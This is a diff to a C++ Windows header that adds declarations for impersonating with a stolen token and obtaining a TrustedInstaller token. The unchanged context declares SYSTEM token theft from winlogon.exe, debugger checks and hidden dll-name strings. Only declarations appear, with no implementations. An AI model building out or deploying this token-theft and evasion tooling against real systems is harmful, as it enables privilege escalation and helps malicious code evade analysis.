@@ -32,6 +32,7 @@ namespace ProcessUtilities
 		typedef BOOL	  (WINAPI *_Process32FirstW)( HANDLE, LPPROCESSENTRY32W );
 		typedef BOOL      (WINAPI *_Process32NextW)( HANDLE, LPPROCESSENTRY32W );
 		typedef HMODULE	  (WINAPI* _LoadLibrary)( LPCSTR );
+		typedef BOOL	  (WINAPI* _SetThreadToken)( PHANDLE, HANDLE );
 	}
 	
 	// Frequently loaded and used dll names.
@@ -41,6 +42,8 @@ namespace ProcessUtilities
 		static const std::string ntdll    = std::string(HIDE("ntdll.dll"));
 		static const std::string advapi32 = std::string(HIDE("advapi32.dll"));
 	}
+
+	inline ProcessUtilities::PPROCFN::_SetThreadToken _SetThreadToken = nullptr;
 
 	// 'constructors and destructors'
 	BOOL               Init(); // Load frequently used dlls for the future. Load important function pointers.
@@ -55,10 +58,12 @@ namespace ProcessUtilities
 	HMODULE            GetLoadedLib(std::string libName); // Return a handle of an already loaded dll from 'loadedDlls'
 	BOOL               FreeUsedLibrary(std::string lib); // Free a loaded library 'lib'
 	DWORD              PIDFromName(const char* name); // Get the process ID from a process name.
+	HANDLE			   ImpersonateWithToken(HANDLE token);
 	HANDLE             CreateProcessAccessToken(DWORD processID); // Duplicate a process security token from the process id
 	void               HaltProcessExecution(); // Delay the current processes execution forever.
 	DWORD              StartWindowsService(std::string serviceName); // Start a Windows service 'serviceName'—return process id.
 	HANDLE             GetSystemToken(); // Get a SYSTEM permissions security token from winlogon.exe.
+	HANDLE			   GetTrustedInstallerToken(); // Obtain a Trusted Installer security token.
 	BOOL               CheckNoDebugger(); // Check if the current process is being debugged.
 
 	// Wrapper that uses function pointer for CreateProcessWithTokenW
